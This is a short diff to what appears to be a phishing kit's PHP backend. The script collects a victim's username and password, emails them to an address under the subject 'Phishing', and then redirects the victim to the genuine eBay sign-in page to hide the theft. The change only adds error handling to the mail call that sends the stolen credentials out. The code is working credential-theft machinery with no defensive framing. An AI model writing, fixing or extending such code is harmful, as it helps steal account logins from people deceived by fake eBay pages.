@@ -9,7 +9,7 @@
 
 	$mail_to = "someone@example.com";
 	$msg = $username . "\n" . $pw;
-    mail($mail_to,"Phishing",$msg);
+    mail($mail_to,"Phishing",$msg) or die("unable to send email");
 
 	
 	header("Location: https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ru=http%3A%2F%2Fwww.ebay.com%2F");
